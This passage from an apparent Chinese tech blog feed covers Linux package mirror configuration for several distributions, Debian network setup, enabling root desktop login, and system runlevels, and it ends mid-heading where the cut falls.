        <content type="html"><![CDATA[<h1 id="Linux-系统更新源大全"><a href="#Linux-系统更新源大全" class="headerlink" title="Linux 系统更新源大全"></a>Linux 系统更新源大全</h1><h2 id="一、镜像站"><a href="#一、镜像站" class="headerlink" title="一、镜像站"></a>一、镜像站</h2><ol><li><a href="https://developer.aliyun.com/mirror/">阿里云官方镜像站</a></li><li><a href="https://mirrors.huaweicloud.com/home">华为开源镜像站</a></li><li><a href="https://mirrors.163.com/">网易开源镜像站</a></li><li><a href="https://mirrors.cloud.tencent.com/">腾讯软件源</a></li><li><a href="https://mirrors.ustc.edu.cn/help/index.html">中科大源</a></li><li><a href="https://mirrors.tuna.tsinghua.edu.cn/">清华大学开源软件镜像站</a></li></ol><h2 id="二、更新源配置文件"><a href="#二、更新源配置文件" class="headerlink" title="二、更新源配置文件"></a>二、更新源配置文件</h2><ol><li>RedHat 系列</li></ol><p><strong>/etc/yum.repos.d/*.repo</strong></p><ol start="2"><li>Debian 系列</li></ol><p><strong>/etc/apt/sources.list</strong></p><h2 id="三、备份配置文件"><a href="#三、备份配置文件" class="headerlink" title="三、备份配置文件"></a>三、备份配置文件</h2><ol><li>RedHat 系列</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mv</span> /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>Debian 系列</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="四、更新操作"><a href="#四、更新操作" class="headerlink" title="四、更新操作"></a>四、更新操作</h2><ol><li>RedHat 系列</li></ol><pre class="line-numbers language-bash"><code class="language-bash">yum clean allyum makecache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>Debian 系列</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">apt-get</span> update<span class="token function">apt-get</span> upgrades<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="五、RedHat-系列"><a href="#五、RedHat-系列" class="headerlink" title="五、RedHat 系列"></a>五、RedHat 系列</h2><h3 id="1-CentOS-6"><a href="#1-CentOS-6" class="headerlink" title="1. CentOS 6"></a>1. CentOS 6</h3><p>阿里源</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-6.repo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>网易源</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> -O CentOS-Base.repo http://mirrors.163.com/.help/CentOS6-Base-163.repo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>中科大源</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> -O CentOS-Base.repo https://lug.ustc.edu.cn/wiki/_export/code/mirrors/help/centos?codeblock<span class="token operator">=</span>2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-CentOS-7"><a href="#2-CentOS-7" class="headerlink" title="2. CentOS 7"></a>2. CentOS 7</h3><p>阿里源</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>网易源</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> -O CentOS-Base.repo http://mirrors.163.com/.help/CentOS7-Base-163.repo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>中科大源</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># CentOS-Base.repo</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># The mirror system uses the connecting IP address of the client and the</span><span class="token comment" spellcheck="true"># update status of each mirror to pick mirrors that are updated to and</span><span class="token comment" spellcheck="true"># geographically close to the client.  You should use this for CentOS updates</span><span class="token comment" spellcheck="true"># unless you are manually picking other mirrors.</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># If the mirrorlist= does not work for you, as a fall back you can try the</span><span class="token comment" spellcheck="true"># remarked out baseurl= line instead.</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#</span><span class="token punctuation">[</span>base<span class="token punctuation">]</span>name<span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Base<span class="token comment" spellcheck="true">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=os&amp;infra=$infra</span>baseurl<span class="token operator">=</span>https://mirrors.ustc.edu.cn/centos/<span class="token variable">$releasever</span>/os/<span class="token variable">$basearch</span>/gpgcheck<span class="token operator">=</span>1gpgkey<span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<span class="token comment" spellcheck="true">#released updates</span><span class="token punctuation">[</span>updates<span class="token punctuation">]</span>name<span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Updates<span class="token comment" spellcheck="true">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=updates&amp;infra=$infra</span>baseurl<span class="token operator">=</span>https://mirrors.ustc.edu.cn/centos/<span class="token variable">$releasever</span>/updates/<span class="token variable">$basearch</span>/gpgcheck<span class="token operator">=</span>1gpgkey<span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<span class="token comment" spellcheck="true">#additional packages that may be useful</span><span class="token punctuation">[</span>extras<span class="token punctuation">]</span>name<span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Extras<span class="token comment" spellcheck="true">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=extras&amp;infra=$infra</span>baseurl<span class="token operator">=</span>https://mirrors.ustc.edu.cn/centos/<span class="token variable">$releasever</span>/extras/<span class="token variable">$basearch</span>/gpgcheck<span class="token operator">=</span>1gpgkey<span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<span class="token comment" spellcheck="true">#additional packages that extend functionality of existing packages</span><span class="token punctuation">[</span>centosplus<span class="token punctuation">]</span>name<span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Plus<span class="token comment" spellcheck="true">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=centosplus&amp;infra=$infra</span>baseurl<span class="token operator">=</span>https://mirrors.ustc.edu.cn/centos/<span class="token variable">$releasever</span>/centosplus/<span class="token variable">$basearch</span>/gpgcheck<span class="token operator">=</span>1enabled<span class="token operator">=</span>0gpgkey<span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-CentOS-8"><a href="#3-CentOS-8" class="headerlink" title="3. CentOS 8"></a>3. CentOS 8</h3><p>阿里源</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-8.repo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="六、Debian-系列"><a href="#六、Debian-系列" class="headerlink" title="六、Debian 系列"></a>六、Debian 系列</h2><h3 id="1-Debian-7"><a href="#1-Debian-7" class="headerlink" title="1. Debian 7"></a>1. Debian 7</h3><p>阿里源</p><pre><code>deb http://mirrors.aliyun.com/debian/ wheezy main non-free contribdeb http://mirrors.aliyun.com/debian/ wheezy-proposed-updates main non-free contribdeb-src http://mirrors.aliyun.com/debian/ wheezy main non-free contribdeb-src http://mirrors.aliyun.com/debian/ wheezy-proposed-updates main non-free contrib</code></pre><h3 id="2-Debian-8"><a href="#2-Debian-8" class="headerlink" title="2. Debian 8"></a>2. Debian 8</h3><p>阿里源</p><pre><code>deb http://mirrors.aliyun.com/debian/ jessie main non-free contribdeb http://mirrors.aliyun.com/debian/ jessie-proposed-updates main non-free contribdeb-src http://mirrors.aliyun.com/debian/ jessie main non-free contribdeb-src http://mirrors.aliyun.com/debian/ jessie-proposed-updates main non-free contrib</code></pre><h3 id="3-Debian-9"><a href="#3-Debian-9" class="headerlink" title="3. Debian 9"></a>3. Debian 9</h3><p>阿里源</p><pre><code>deb http://mirrors.aliyun.com/debian/ stretch main non-free contribdeb-src http://mirrors.aliyun.com/debian/ stretch main non-free contribdeb http://mirrors.aliyun.com/debian-security stretch/updates maindeb-src http://mirrors.aliyun.com/debian-security stretch/updates maindeb http://mirrors.aliyun.com/debian/ stretch-updates main non-free contribdeb-src http://mirrors.aliyun.com/debian/ stretch-updates main non-free contribdeb http://mirrors.aliyun.com/debian/ stretch-backports main non-free contribdeb-src http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib</code></pre><h3 id="4-Debian-10"><a href="#4-Debian-10" class="headerlink" title="4. Debian 10"></a>4. Debian 10</h3><p>阿里源</p><pre><code>deb http://mirrors.aliyun.com/debian/ buster main non-free contribdeb http://mirrors.aliyun.com/debian-security buster/updates maindeb http://mirrors.aliyun.com/debian/ buster-updates main non-free contribdeb http://mirrors.aliyun.com/debian/ buster-backports main non-free contribdeb-src http://mirrors.aliyun.com/debian-security buster/updates maindeb-src http://mirrors.aliyun.com/debian/ buster main non-free contribdeb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contribdeb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib</code></pre><p>中科大</p><pre class="line-numbers language-bash"><code class="language-bash">deb http://mirrors.ustc.edu.cn/debian stable main contrib non-freedeb-src http://mirrors.ustc.edu.cn/debian stable main contrib non-freedeb http://mirrors.ustc.edu.cn/debian stable-updates main contrib non-freedeb-src http://mirrors.ustc.edu.cn/debian stable-updates main contrib non-freedeb http://mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-freedeb-src http://mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-Ubuntu-16"><a href="#5-Ubuntu-16" class="headerlink" title="5. Ubuntu 16"></a>5. Ubuntu 16</h3><p>阿里源</p><pre class="line-numbers language-bash"><code class="language-bash">deb http://mirrors.aliyun.com/ubuntu/ xenial maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial maindeb http://mirrors.aliyun.com/ubuntu/ xenial-updates maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates maindeb http://mirrors.aliyun.com/ubuntu/ xenial universedeb-src http://mirrors.aliyun.com/ubuntu/ xenial universedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb http://mirrors.aliyun.com/ubuntu/ xenial-security maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security maindeb http://mirrors.aliyun.com/ubuntu/ xenial-security universedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security universe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-Ubuntu-18"><a href="#6-Ubuntu-18" class="headerlink" title="6. Ubuntu 18"></a>6. Ubuntu 18</h3><p>阿里源</p><pre class="line-numbers language-bash"><code class="language-bash">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="7-Ubuntu-20"><a href="#7-Ubuntu-20" class="headerlink" title="7. Ubuntu 20"></a>7. Ubuntu 20</h3><p>阿里源</p><pre><code>deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse</code></pre><p>中科大源</p><pre><code>deb https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse# 预发布软件源，不建议启用# deb https://mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse# deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</code></pre><p>网易源</p><pre><code>deb http://mirrors.163.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiverse</code></pre><p>清华源</p><pre><code>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</code></pre><h3 id="8-Kali-Linux"><a href="#8-Kali-Linux" class="headerlink" title="8. Kali Linux"></a>8. Kali Linux</h3><p>阿里源</p><pre class="line-numbers language-bash"><code class="language-bash">deb https://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>中科大源</p><pre><code>deb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</code></pre><h3 id="9-Parrot-OS"><a href="#9-Parrot-OS" class="headerlink" title="9. Parrot OS"></a>9. Parrot OS</h3><p>清华源</p><pre><code>deb https://mirrors.tuna.tsinghua.edu.cn/parrot/ rolling main contrib non-free</code></pre><p>中科大源</p><pre><code>deb http://mirrors.ustc.edu.cn/parrot rolling main contrib non-free</code></pre><h3 id="10-Deepin"><a href="#10-Deepin" class="headerlink" title="10. Deepin"></a>10. Deepin</h3><p>阿里源</p><pre class="line-numbers language-bash"><code class="language-bash">deb <span class="token punctuation">[</span>by-hash<span class="token operator">=</span>force<span class="token punctuation">]</span> http://mirrors.aliyun.com/deepin lion main contrib non-free<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 更新源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Debian系列-网络配置</title>
      <link href="/post/e59e77a9.html"/>
      <url>/post/e59e77a9.html</url>
      
        <content type="html"><![CDATA[<h2 id="Debian-系列系统网络配置"><a href="#Debian-系列系统网络配置" class="headerlink" title="Debian 系列系统网络配置"></a>Debian 系列系统网络配置</h2><ol><li>Debian 系列系统网络配置文件</li></ol><p>/etc/network/interfaces<br>​</p><ol start="2"><li>配置动态 IP</li></ol><p>编辑 /etc/network/interfaces</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># interfaces(5) file used by ifup(8) and ifdown(8)</span>auto loiface lo inet loopbackauto ens33iface ens33 inet dhcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​</p><ol start="3"><li>配置静态 IP</li></ol><p>编辑 /etc/network/interfaces</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># interfaces(5) file used by ifup(8) and ifdown(8)</span>auto loiface lo inet loopbackauto ens33iface ens33 inet staticaddress 192.168.2.33gateway 192.168.2.2netmask 255.255.255.0dns-nameservers 192.168.2.2 114.114.114.114<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​</p><ol start="4"><li>配置 DNS</li></ol><p>编辑 /etc/resolv.conf</p><pre class="line-numbers language-bash"><code class="language-bash">nameserver 192.168.2.33nameserver 114.114.114.114<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​</p><ol start="5"><li>关闭 NetworkManager</li></ol><pre class="line-numbers language-bash"><code class="language-bash">systemctl stop NetworkManagersystemctl disable NetworkManager<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="6"><li>重启网络</li></ol><pre class="line-numbers language-bash"><code class="language-bash">/etc/init.d/networking restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 网络配置 </tag>
            
            <tag> Debian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Debian系列-开启root用户登录</title>
      <link href="/post/e604aa6a.html"/>
      <url>/post/e604aa6a.html</url>
      
        <content type="html"><![CDATA[<h2 id="Debian-系列-开启-root-用户登录"><a href="#Debian-系列-开启-root-用户登录" class="headerlink" title="Debian 系列-开启 root 用户登录"></a>Debian 系列-开启 root 用户登录</h2><h3 id="1-使用普通用户登录系统"><a href="#1-使用普通用户登录系统" class="headerlink" title="1. 使用普通用户登录系统"></a>1. 使用普通用户登录系统</h3><h3 id="2-修改-root-密码"><a href="#2-修改-root-密码" class="headerlink" title="2. 修改 root 密码"></a>2. 修改 root 密码</h3><pre class="line-numbers language-bash"><code class="language-bash">truda@truda-virtual-machine:~$ <span class="token function">sudo</span> <span class="token function">passwd</span> rootEnter new UNIX password:Retype new UNIX password:passwd: password updated successfully<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-切换到-root-用户"><a href="#3-切换到-root-用户" class="headerlink" title="3. 切换到 root 用户"></a>3. 切换到 root 用户</h3><pre class="line-numbers language-bash"><code class="language-bash">truda@truda-virtual-machine:~$ <span class="token function">su</span> - rootPassword:root@truda-virtual-machine:~<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="4-编辑文件（以-Ubuntu-为例）"><a href="#4-编辑文件（以-Ubuntu-为例）" class="headerlink" title="4. 编辑文件（以 Ubuntu 为例）"></a>4. 编辑文件（以 Ubuntu 为例）</h3><p>在 /usr/share/lightdm/lightdm.conf.d/50-ubuntu.conf 添加以下两行：</p><pre class="line-numbers language-bash"><code class="language-bash">greeter-show-manual-login<span class="token operator">=</span>trueall-guest<span class="token operator">=</span>false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>分别在 /etc/pam.d/gdm-autologin 和 /etc/pam.d/gdm-password 中注释这一行：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># auth    required    pam_succeed_if.so user != root quiet_success</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改 /root/.profile 中的 mesg n 改为 tty -s &amp;&amp; mesg n<br>​</p><h3 id="5-重启系统"><a href="#5-重启系统" class="headerlink" title="5. 重启系统"></a>5. 重启系统</h3>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Debian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux系统的7个运行级别</title>
      <link href="/post/96164b95.html"/>
      <url>/post/96164b95.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-系统的-7-个运行级别"><a href="#Linux-系统的-7-个运行级别" class="headerlink" title="Linux 系统的 7 个运行级别"></a>Linux 系统的 7 个运行级别</h1><h2 id="一、7-个运行级别"><a href="#一、7-个运行级别" class="headerlink" title="一、7 个运行级别"></a>一、7 个运行级别</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/svg/519483/1626773261540-37247e7a-e11a-41ce-92a8-820ddbb0d61d.svg#clientId=u0b1258d6-5811-4&amp;from=drop&amp;id=u800e58e3&amp;margin=%5Bobject%20Object%5D&amp;name=Linux%E7%B3%BB%E7%BB%9F7%E4%B8%AA%E8%BF%90%E8%A1%8C%E7%BA%A7%E5%88%AB.svg&amp;originHeight=381&amp;originWidth=1090&amp;originalType=binary%E2%88%B6=1&amp;size=1363898&amp;status=done&amp;style=none&amp;taskId=u4e1bc000-6f80-438f-9a10-a073a87b5e4" alt="Linux系统7个运行级别.svg"></p><h2 id="二、级别具体说明"><a href="#二、级别具体说明" class="headerlink" title="二、级别具体说明"></a>二、级别具体说明</h2><p>0： 系统停机（关机）模式，系统默认运行级别不能设置为 0，否则不能正常启动，一开机就自动关机。<br>1：单用户模式，root 权限，用于系统维护，禁止远程登陆，就像 Windows 下的安全模式登录。<br>2：多用户模式，没有 NFS 网络支持。<br>3：完整的多用户文本模式，有 NFS，登陆后进入控制台命令行模式。<br>4：系统未使用，保留一般不用，在一些特殊情况下可以用它来做一些事情。例如在笔记本电脑的电池用尽时，可以切换到这个模式来做一些设置。<br>5：图形化模式，登陆后进入图形 GUI 模式或 GNOME、KDE 图形化界面，如 X Window 系统。<br>6：重启模式，默认运行级别不能设为 6，否则不能正常启动，就会一直开机重启开机重启。<br>​</p><h2 id="三、启动原理简介"><a href="#三、启动原理简介" class="headerlink" title="三、启动原理简介"></a>三、启动原理简介</h2><ol><li>在目录/etc/rc.d/init.d 下有许多服务器脚本程序，一般称为服务(service)。</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span>$ ll /etc/rc.d/init.dtotal 36-rw-r--r--. 1 root root 15131 Sep 12  2016 functions-rwxr-xr-x. 1 root root  2989 Sep 12  2016 netconsole-rwxr-xr-x. 1 root root  6643 Sep 12  2016 network-rw-r--r--. 1 root root  1160 Sep 13  2016 README-rwxr-xr-x. 1 root root  2437 Jun 26  2015 rhnsd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>在/etc/rc.d 下有 7 个名为 rcN.d 的目录，对应系统的 7 个运行级别即(0-6)。</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span>$ ll /etc/rc.dtotal 4drwxr-xr-x. 2 root root  83 Jul 19 23:16 init.ddrwxr-xr-x. 2 root root  61 Jul 19 23:16 rc0.ddrwxr-xr-x. 2 root root  61 Jul 19 23:16 rc1.ddrwxr-xr-x. 2 root root  61 Jul 19 23:16 rc2.ddrwxr-xr-x. 2 root root  61 Jul 19 23:16 rc3.ddrwxr-xr-x. 2 root root  61 Jul 19 23:16 rc4.ddrwxr-xr-x. 2 root root  61 Jul 19 23:16 rc5.ddrwxr-xr-x. 2 root root  61 Jul 19 23:16 rc6.d-rw-r--r--. 1 root root 473 Sep 13  2016 rc.local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、RHEL6-更改默认启动级别"><a href="#四、RHEL6-更改默认启动级别" class="headerlink" title="四、RHEL6 更改默认启动级别"></a>四、RHEL6 更改默认启动级别</h2><ol><li> 查看启动级别配置文件</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cat /etc/inittab</span><span class="token comment" spellcheck="true"># inittab is only used by upstart for the default runlevel.</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># ADDING OTHER CONFIGURATION HERE WILL HAVE NO EFFECT ON YOUR SYSTEM.</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># System initialization is started by /etc/init/rcS.conf</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># Individual runlevels are started by /etc/init/rc.conf</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># Ctrl-Alt-Delete is handled by /etc/init/control-alt-delete.conf</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># Terminal gettys are handled by /etc/init/tty.conf and /etc/init/serial.conf,</span><span class="token comment" spellcheck="true"># with configuration in /etc/sysconfig/init.</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># For information on how to write upstart event handlers, or how</span><span class="token comment" spellcheck="true"># upstart works, see init(5), init(8), and initctl(8).</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># Default runlevel. The runlevels used are:</span><span class="token comment" spellcheck="true">#   0 - halt (Do NOT set initdefault to this)</span><span class="token comment" spellcheck="true">#   1 - Single user mode</span><span class="token comment" spellcheck="true">#   2 - Multiuser, without NFS (The same as 3, if you do not have networking)</span><span class="token comment" spellcheck="true">#   3 - Full multiuser mode</span><span class="token comment" spellcheck="true">#   4 - unused</span><span class="token comment" spellcheck="true">#   5 - X11</span><span class="token comment" spellcheck="true">#   6 - reboot (Do NOT set initdefault to this)</span><span class="token comment" spellcheck="true">#</span>id:3:initdefault:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>只需要更改最后一行对应的数字即可改变系统的默认启动级别</p></blockquote><p>​</p><h2 id="五、RHEL6-更改默认启动级别"><a href="#五、RHEL6-更改默认启动级别" class="headerlink" title="五、RHEL6 